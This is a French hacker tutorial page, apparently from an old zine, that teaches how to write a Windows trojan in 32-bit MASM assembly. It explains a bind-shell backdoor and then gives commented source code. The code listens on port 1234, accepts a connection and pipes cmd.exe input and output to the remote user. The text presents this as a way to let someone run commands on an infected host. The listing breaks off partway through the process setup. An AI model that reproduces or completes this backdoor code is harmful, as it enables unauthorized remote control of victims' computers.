@@ -1,0 +1,503 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Author" content="obscurer">
+   <meta name="GENERATOR" content="Mozilla/4.51 [fr] (Win95; I) [Netscape]">
+   <title>Cr&eacute;ation d'un Trojan en assembleur 32-bits</title>
+</head>
+<body text="#000000" bgcolor="#FFFFF8" link="#339966" vlink="#339966" alink="#339966">
+<div align="left"></div>
+<table width="283" border="0" cellspacing="0" cellpadding="0" background="IMAGES/fnd_stitre.jpg" height="40">
+  <tr> 
+    <td width="23">&nbsp;</td>
+    <td width="294"><font face="Verdana, Arial, Helvetica, sans-serif" color="#FFCC00"><font color="#CCCCCC" size="2">TROJAN 
+      EN ASM</font></font></td>
+  </tr>
+</table>
+<div align="left"></div>
+<p>&nbsp; 
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>I\ Introduction</u></b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Salut tout le monde, 
+  aujoud'hui je vous propose de coder quelque chose de pas commun, c'est &agrave; 
+  dire... (***Roulements de tambours***) un (***Roulements de tambours***) TROJAN 
+  ! Merde, vous le saviez ? Ha oui, c'est &eacute;crit en gros au dessus... </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila, tout d'abord 
+  une petite d&eacute;finition d'un trojan car il y a parfois m&eacute;prise : 
+  </font>
+<p> 
+  <center>
+    <font face="Verdana, Arial, Helvetica, sans-serif" size="2">Trojan&nbsp; = 
+    Troyen = Cheval de Troie = Socket de Troie</font> 
+  </center>
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2">Un Trojan n'est 
+  pas un virus ! Un virus se copie dans un autre programme pour s'executer, alors 
+  que le trojan est certes tout aussi discret, mais il doit &ecirc;tre execut&eacute; 
+  par la victime. Cependant, certains anti-virus d&eacute;tectent les trojans 
+  (et mettent un &eacute;norme panneaux rouge hideux d'ailleurs) Ensuite, son 
+  but n'est pas de se reproduire, ni d'infecter quoi que ce soit, mais de rester 
+  toujours actif, et de se relancer &agrave; chaque d&eacute;marrage. Il permet 
+  &agrave; n'importe qui de se connecter &agrave; un h&ocirc;te infect&eacute;, 
+  et d'executer &agrave; peu pr&egrave;s n'importe quoi. <br>
+  Voila pour la th&eacute;orie. <br>
+  Examinont maintenant le probl&egrave;me plus concr&egrave;tement. On va faire 
+  un Trojan qui balance un shell dos quand on se connecte sur son port. On le 
+  code en Assembleur pour que le programme soit le plus petit possible. Let's 
+  go !!! </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>II\ La Th&eacute;orie</u></b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Commen&ccedil;ons 
+  par &eacute;tablir ce que devra faire notre programme : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>La partie "socket"</b> 
+  <br>
+  On va proc&eacute;der comme suit : <br>
+  On initialise le syst&egrave;me de socket (h&eacute; oui, on est sous Windows 
+  :) </font>
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">WSAStartup</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">On remplit une structure 
+sockaddr_in <br>
+Cr&eacute;ation d'un socket </font> 
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">socket</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">On le lie </font> 
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">bind</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">On le met en &eacute;coute 
+</font> 
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">listen</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">On attend une connexion 
+</font> 
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">accept</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila, la partie socket 
+est pas compliqu&eacute;e du tout, on verra tout &ccedil;a dans la partie 3 </font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>La partie "shell"</b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">L&agrave;, c'est 
+  moins &eacute;vident. Je r&eacute;sume le probl&egrave;me, on doit faire en 
+  sorte que le Trojan balance un shell sur un port donn&eacute;. (On va prendre 
+  1234 pour l'exemple au fait). <br>
+  Il faut donc qu'on lance un "command.com" pour windows9x et un "cmd.exe" pour 
+  Windows NT <br>
+  Ca, c'est simple gr&acirc;ce &agrave; l'API "CreateProcess", qui va nous permettre 
+  d'executer le programme. <br>
+  Oui, d'accord mais comment faire pour que ce que "cmd.exe" &eacute;crit dans 
+  la console arrive jusqu'&agrave; notre ordinateur distant ? De m&ecirc;me, on 
+  va devoir envoyer des donn&eacute;es re&ccedil;ues du socket vers "cmd.exe" 
+  ? <br>
+  Pour pouvoir faire tout &ccedil;a, on va utiliser les pipes (prononcer pa&iuml;pe, 
+  s'il vous plait, un peu de tenue) <br>
+  "pipe" k&eacute;sako ? Et bien c'est tr&egrave;s simple, je vais expliquer tout 
+  &ccedil;a : <br>
+  Un programme a trois flux d'entr&eacute;e/sortie, &agrave; savoir STDIN en entr&eacute;e 
+  (ou le programme recoit ses donn&eacute;es), STDOUT (ou le programme envoie 
+  des donn&eacute;es) et STDERR (ou le programme envoie les messages d'erreurs). 
+  Quand on lance "cmd.exe", son flux STDIN correspond &agrave; notre clavier, 
+  STDOUT et STDERR &agrave; l'&eacute;cran de l'odinateur local. Fort bien. Et 
+  bien gr&acirc;ce aux pipes on va pouvoir choisir, ou le programme enverra ses 
+  donn&eacute;es, ses erreurs, et ou il recevra ses donn&eacute;es. En fait on 
+  va rediriger les 3 flux du programme vers le notre, ce qui nous permettra de 
+  lui envoyer ce qu'on veut, et de recevoir les donn&eacute;es qu'il devrait normalement 
+  imprimer &agrave; l'&eacute;cran. On cr&eacute;&eacute; un pipe avec la fonction 
+  "CreatePipe" (tiens donc ;). <br>
+  Un pipe, c'est un tunnel ou passent les donn&eacute;e en gros ;) <br>
+  Je vous fait un dessin : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">read_1, read_2, 
+  write_1, et write_2, sont des variables du type HANDLE, que l'on re&ccedil;oit 
+  de la fonction "CreatePipe", les pointill&eacute;s repr&eacute;sentent le tunnel 
+  magique de obscurer le magicien <br>
+  &nbsp; <br>
+  &nbsp; </font>
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">read_1------------------------------------------------------write_1 
+  </font> 
+  <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">read_2------------------------------------------------------write_2</font>
+</blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">Le principe est le 
+suivant : lorsqu'on &eacute;crit des donn&eacute;es dans write_1, elles ressortent 
+par read_1 <br>
+De m&ecirc;me, quand quelque chose est &eacute;crit dans le handle write_2, les 
+donn&eacute;es dont lisibles par le handle read_2. <br>
+L'interet est le suivant : On va lancer "cmd.exe" avec : <br>
+comme flux STDOUT et STDERR le m&ecirc;me handle write_1 <br>
+comme flux STDIN le Handle read_2 </font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">on pourra donc 
+  lire ce que "cmd.exe" envoi en lisant le handle read_1, et on pourra envoyer 
+  ce qu'on veut &agrave; "cmd.exe" en envoyant les donn&eacute;es dans write_2. 
+  C'est tout simple &agrave; coder. </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On va donc : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">-Cr&eacute;er 2 
+  pipes <br>
+  -Lancer "cmd.exe" avec les flux I/O modifi&eacute;s <br>
+  -Rediriger les donn&eacute;es de read_1 vers la connexion pour que l'utilisateur 
+  connect&eacute; voit ce qu'il fait <br>
+  -Rediriger les donn&eacute;es que l'utilisateur envoi vers write_2 pour que 
+  ce qu'&eacute;crive l'utilisateur puisse &ecirc;tre execut&eacute; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Maintenant, on 
+  inspire un grand coup, et on souffle rapidement. <br>
+  mfffffffff.........pfffffffiiiiou. <br>
+  C'est parti pour la derni&egrave;re ligne droite, even if there's no finish 
+  line... <br>
+  &nbsp; </font>
+<p> 
+<hr width="100%">
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>III\ La Pratique</u></b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Pour suivre la 
+  pratique, vous aurez besoin de : </font>
+<blockquote><font face="Verdana, Arial, Helvetica, sans-serif" size="2">o Un compilateur 
+  Assembleur 32-bits&nbsp; (Masm32, ou Tasm32) <br>
+  o Heu... Je crois que c'est tout</font></blockquote>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2">Je vous le dit tout 
+de suite j'ai cod&eacute; &ccedil;a sous Windows NT 4 avec Masm32 donc vous me 
+mailer si un truc marche pas (je suis na&iuml;f, je crois que qqun en a qqchose 
+&agrave; foutre de mes articles :) <br>
+Si vous n'avez aucune notion d'assembleur, aller lire quelque tuts ou articles. 
+<br>
+Pour avoir quelque notions d'assembleurs 32-bits lisez IGA-10, il y a un article&nbsp; 
+sur &ccedil;a si je me souviens bien... Vous pigerez les bases. </font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">C'est parti, je 
+  balance le code, et je commente </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">------------------------------------------------------------------ 
+  CUT HERE ---------------------------------------------------------------------</font> 
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <tt><font color="#CC00CC">.386</font></tt> <br>
+  <tt><font color="#CC00CC">.model flat, stdcall</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">include 
+  \masm32\include\windows.inc&nbsp; </font><font color="#339933">; Contient toute 
+  les significations des Flags</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">includelib 
+  \masm32\lib\kernel32.lib&nbsp; </font><font color="#339933">; Pour quasiment 
+  toutes les APIS dont on a besoin</font></tt> <br>
+  <tt><font color="#CC00CC">include \masm32\include\kernel32.inc</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">includelib 
+  \masm32\lib\Wsock32.lib&nbsp;&nbsp; </font><font color="#339933">; Les fonctions 
+  pour les sockets</font></tt> <br>
+  <tt><font color="#CC00CC">include \masm32\include\wsock32.inc</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">WinMain 
+  PROTO :DWORD,:DWORD,:DWORD,:DWORD </font><font color="#339933">; Notre fonction 
+  principale</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">.data</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;hInstance&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  dd 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933"> 
+  ; pour la forme :)</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;cmd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  db "\winnt\system32\cmd.exe",0&nbsp; </font><font color="#339933">; je vous 
+  fait pas de dessin</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">.code</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">start:</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; invoke 
+  GetModuleHandle, NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933">&nbsp; 
+  ; On d&eacute;marre le prog</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov hInstance, 
+  eax</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  invoke WinMain,hInstance,NULL,NULL,NULL&nbsp; </font><font color="#339933">; 
+  la fonction ! la fonction !</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; invoke 
+  ExitProcess,NULL</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">WinMain 
+  proc hInst:DWORD,hPrevInst:DWORD,CmdLine:DWORD,CmdShow:DWORD</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">LOCAL 
+  sin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :sockaddr_in&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Structure sockaddr_in pour le socket</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL wsaData&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :WSADATA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Structure pour WSA*</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL sock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  :UINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Le socket d'attente</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL socka&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  :UINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Le socket accept&eacute; (client)</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL output&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;buffer pour envoyer</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL input&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  :DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;buffer pour recevoir</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">LOCAL 
+  info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :PROCESS_INFORMATION&nbsp; 
+  </font><font color="#339933">;sortie de "CreateProcess"</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL starti&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :STARTUPINFO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Param&egrave;tres pour "CreateProcess"</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL secu&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  :SECURITY_ATTRIBUTES&nbsp; </font><font color="#339933">;idem</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL read_1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :HANDLE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Handles pour les pipes</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL write_1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :HANDLE</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL read_2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :HANDLE</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL write_2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :HANDLE</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">LOCAL byte_read&nbsp;&nbsp;&nbsp; :DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Pour WriteFile et ReadFile</font></tt> <br>
+  <tt><font color="#CC00CC">LOCAL byte_toread&nbsp; :DWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">;Pour PeekNamedPipe</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  Alloue un peu de m&eacute;moire pour les buffers (pas trop quand m&ecirc;me 
+  :)</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke GlobalAlloc,GPTR,32000</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;mov output,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on met l'adresse de la m&eacute;moire allou&eacute;es 
+  dans output</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == NULL&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#339933">; 
+  v&eacute;rifie si on a bien de la m&eacute;oire pour pas faire n'importe quoi</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  GlobalAlloc,GPTR,32000</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;mov input,eax</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == NULL</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  Initialize le systeme de socket version 2.2 (sacr&eacute; windows)</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;xor ebx,ebx</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;mov bx,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; On met 2 dans bl</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;shl bx,8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on bouge le 2</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;or bx, 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on met l'autre 2</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke WSAStartup,ebx,ADDR wsaData</font><font color="#339933"> 
+  ; GO</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  On v&eacute;rifie si il y a eu un probl&egrave;me quelconque</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax != NULL</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; Si oui on ret (Non, pas de message d'erreur =)</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  On remplit gaiment la structure sockaddr_in</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;mov sin.sin_family,AF_INET&nbsp; </font><font color="#339933">; 
+  famille du socket</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;mov sin.sin_addr,NULL&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on ne connait pas l'adresse du client</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;mov sin.sin_port,0D204h&nbsp;&nbsp; </font><font color="#339933">; 
+  in network byte order = port 1234</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">;&nbsp;&nbsp;&nbsp; 
+  NETWORK BYTE ORDER</font></tt> <br>
+  <tt><font color="#339933">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1234 en decimal</font></tt> 
+  <br>
+  <tt><font color="#339933">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 04D2 en hex</font></tt> 
+  <br>
+  <tt><font color="#339933">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D204 en network byte 
+  oder (inversez les deux bytes tout simplement)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  (N.B: oubliez pas qu'il faut mettre un 0 devant un chiffre en Hexa qui commence 
+  avc une ;lettre)</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  On cr&eacute;&eacute; un socket</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke socket,AF_INET,SOCK_STREAM,NULL</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;mov sock,eax&nbsp;&nbsp;&nbsp; </font><font color="#339933">; 
+  on sauve le handle pour le socket</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  Petite v&eacute;rification</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == INVALID_SOCKET</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  bind le socket</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke bind,sock,ADDR sin,SIZEOF sockaddr_in</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == SOCKET_ERROR</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  le met en &eacute;coute</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke listen,sock,1</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == SOCKET_ERROR</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  Attend une connexion ind&eacute;finiment</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke accept,sock,NULL,NULL</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == INVALID_SOCKET</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;ret</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">mov 
+  socka,eax&nbsp;&nbsp;&nbsp;</font><font color="#339933"> ; on sauve le handle 
+  du socket qui est accept&eacute;</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  Ok, qqun s'est connect&eacute; !</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">invoke 
+  RtlZeroMemory,ADDR secu,SIZEOF SECURITY_ATTRIBUTES </font><font color="#339933">; 
+  met &agrave; z&eacute;ro la structure</font></tt> <br>
+  <tt><font color="#CC00CC">mov secu.niLength,SIZEOF SECURITY_ATTRIBUTES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on met la taille de la structure</font></tt> 
+  <br>
+  <tt><font color="#CC00CC">mov secu.bInheritHandle,TRUE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; handles h&eacute;ritables</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">&nbsp;invoke 
+  CreatePipe,ADDR read_1,ADDR write_1,ADDR secu,32000 </font><font color="#339933">; 
+  cr&eacute;ation des pipes</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == NULL</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;jmp die</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;invoke CreatePipe,ADDR read_2,ADDR write_2,ADDR 
+  secu,32000</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.if eax == NULL</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;jmp die</font></tt> <br>
+  <tt><font color="#CC00CC">&nbsp;.endif</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#339933">; 
+  read_1 correspond &agrave; write_1</font></tt> <br>
+  <tt><font color="#339933">; read_2 correspond &agrave; write_2</font></tt> <br>
+  <tt><font color="#339933">; je vais bien, tout va bien :)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">invoke 
+  RtlZeroMemory,ADDR starti,SIZEOF STARTUPINFO&nbsp;&nbsp;&nbsp;</font><font color="#339933"> 
+  ; on vide starti (simple pr&eacute;caution)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">invoke 
+  GetStartupInfo,ADDR starti&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#339933">; on choppe les param&egrave;tres</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">mov 
+  starti.cb,SIZEOF STARTUPINFO&nbsp; </font><font color="#339933">; taille de 
+  la structure</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#CC00CC">mov 
+  eax,write_1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933"> 
+  ; on met hStdError et hStdOutput sur write_1</font></tt> <br>
+  <tt><font color="#CC00CC">mov starti.hStdError,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#339933"> 
+  ; pour le process cr&eacute;&eacute; apr&egrave;s, STDERR=STDOUT=write_1</font></tt> 
+  <br>
